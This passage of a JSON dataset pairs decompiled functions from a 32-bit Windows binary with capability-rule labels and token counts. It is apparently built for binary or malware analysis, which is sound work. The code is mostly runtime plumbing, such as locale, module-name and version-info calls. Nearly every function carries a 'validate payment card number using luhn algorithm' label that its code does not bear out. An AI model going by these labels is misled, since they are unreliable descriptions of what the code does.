        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bdc4(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.0040aba8(1, &var_20h, 4);\n    fcn.0040bd64(arg_8h_00);\n    return;\n}\n",
        "token_count": 152
    },
    "0040c900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c900(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040c148(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040c148(&stack0xfffffffc);\n    }\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 104
    },
    "0040cb74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040cb74(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        uVar3 = fcn.0040580c();\n        if ((uVar3 < *param_2) || (cVar1 = *(in_EAX + -1 + *param_2),  uVar3 = cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar3 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar3 >> 3) + 0x492828) >> (uVar3 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            iVar2 = fcn.0040e7b8();\n            *param_2 = iVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 246
    },
    "0040d220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040d220(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040d254();\n    if (cVar1 == '\\0') {\n        fcn.00409774();\n    }\n    return dStack20;\n}\n",
        "token_count": 67
    },
    "0040d2f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d2f0(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40d314;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40d334;\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 236
    },
    "0040d33c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d33c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405620();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "0040d3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d3f0(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40d503;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040d3b4(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.00405584();\n        fcn.0040d3b4(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.00405584();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040d3b4(&var_14h, 6, &stack0xfffffffc);\n        fcn.00405584();\n        fcn.0040d3b4(&var_18h, 6, &stack0xfffffffc);\n        fcn.00405584();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00405554(0x40d50a);\n    return;\n}\n",
        "token_count": 441
    },
    "0040d5c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d5c8(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40d65f;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d33c(puVar3);\n    iVar1 = fcn.00409f20();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d514, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x4988f4;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040d550;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d550, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00405530(0x40d666);\n    return;\n}\n",
        "token_count": 402
    },
    "0040d8b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d8b4(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_458h;\n    uint *var_358h;\n    uint var_354h;\n    uint *var_350h;\n    uint var_34ch;\n    int32_t var_348h;\n    uint var_344h;\n    int32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uint var_312h;\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = in_EDX - var_32ch;\n            goto code_r0x0040d92a;\n        }\n    }\n    iVar3 = *0x4987f8;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040d8a8();\ncode_r0x0040d92a:\n    fcn.0040ea40(iVar3);\n    fcn.0040a8fc();\n    var_340h = 0x40da34;\n    var_338h = 0x40da34;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        var_340h = fcn.004059dc();\n        iVar3 = fcn.0040a870();\n        if ((iVar3 != 0) && (*(var_340h + -1 + iVar3) != '.')) {\n            var_338h = 0x40da38;\n        }\n    }\n    uVar4 = fcn.00406a10(*(*0x495ce0 + 4), &var_312h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00404530();\n    var_358h = &var_458h;\n    var_354h._0_1_ = 4;\n    var_350h = &var_10dh;\n    var_34ch._0_1_ = 6;\n    var_348h = var_8h;\n    var_344h._0_1_ = 5;\n    var_33ch._0_1_ = 6;\n    var_334h._0_1_ = 6;\n    fcn.0040af60(4, &var_358h);\n    fcn.0040a870();\n    return;\n}\n",
        "token_count": 696
    },
    "0040db04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040db04(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00405584();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "0040db40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db40(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40db54;\n        fcn.00404974();\n    }\n    uStack44 = 0x40db9a;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040db40::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040afa0(arg_8h_00);\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40dba1;\n    iStack48 = 0x40db99;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 256
    },
    "0040dbc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040dbc0(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00407550();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "0040dbfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dbfc(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40dc12;\n        fcn.00404974();\n    }\n    uStack48 = 0x40dc68;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040dbfc::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.00407550();\n    fcn.0040afa0(arg_8h_00);\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40dc6f;\n    iStack52 = 0x40dc67;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 270
    },
    "0040dc90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040dc90(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    fcn.00405584();\n    *(in_EAX + 8) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 145
    },
    "0040ddd4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040ddd4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40de70;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.00407550();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.004055c8();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.00407550();\n    fcn.0040db40(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40de77;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 384
    },
    "0040de90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de90(uint arg_8h)\n\n{\n    fcn.0040ddd4();\n    fcn.0040de80();\n    return;\n}\n",
        "token_count": 40
    },
    "0040dec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040dec4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040df28:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040df31;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040df28;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040df31:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 550
    },
    "0040e128": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e128(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40e1e1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040dec4();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40e17f;\n            iVar3 = fcn.0040df5c(&stack0xfffffffc);\n            goto code_r0x0040e1b4;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040e128::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.00407550();\n            iVar3 = fcn.0040db40(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040e1b4;\n        }\n    }\n    iVar3 = fcn.0040db04();\ncode_r0x0040e1b4:\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40e1e8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 488
    },
    "0040e3ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040e3ac(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x40e482;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_8h = 0xffffffff;\n    puStack48 = 0x40e3d9;\n    fcn.004055c8();\n    puStack48 = 0x40e3e1;\n    fcn.00405a34();\n    puStack48 = &fcn.0040e3ac::var_ch;\n    uStack52 = 0x40e3ed;\n    uStack52 = fcn.004059dc();\n    puStack56 = 0x40e3f3;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40e400;\n        pBlock = fcn.00402f00();\n        uStack60 = 0x40e465;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.004059dc(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40e494, &fcn.0040e3ac::lplpBuffer, &fcn.0040e3ac::puLen);\n            if (iVar1 != 0) {\n                var_8h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402f1c(0x40e46c);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40e489;\n    puStack48 = 0x40e481;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 606
    },
    "0040eab4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040eab4(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint var_1h;\n    \n    sub.kernel32.dll_GetCPInfo(0, arg_8h + -0x14);\n    for (iVar4 = 0; (iVar4 < 0xc && ((*(arg_8h + -0xe + iVar4) | *(arg_8h + -0xd + iVar4)) != 0)); iVar4 = iVar4 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar4);\n        uVar1 = *(arg_8h + -0xd + iVar4);\n        if (var_1h <= uVar1) {\n            cVar3 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x492828;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar3 = cVar3 + -1;\n            } while (cVar3 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 339
    },
    "0040f23c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f23c(void)\n\n{\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 37
    },
    "0040f280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f280(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40f30b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == 0) {\n        iVar1 = fcn.0040dbc0();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        puStack32 = &stack0xfffffffc;\n        fcn.0040d2f0();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar1 = fcn.0040dbfc(1, &var_10h);\n    }\n    *(iVar1 + 0xc) = in_EAX;\n    fcn.00404ec4();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40f312;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 330
    },
    "0040f678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f678(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 287
    },
    "0040fa18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040fa18(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40fa27;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40fa8a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40fa6c;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.004059dc();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 250
    },
    "00410e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410e60(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410eef;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415d24();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415d24();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407550();\n    fcn.0040db40(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410ef6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 304
    },
    "00410f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00410f50(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x410fdf;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.00415d24();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.00415d24();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.00407550();\n    fcn.0040db40(arg_8h, arg_ch);\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x410fe6;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 303
    },
    "004113c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004113c0(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "004113f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004113f0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.004113f0(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "0041144c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
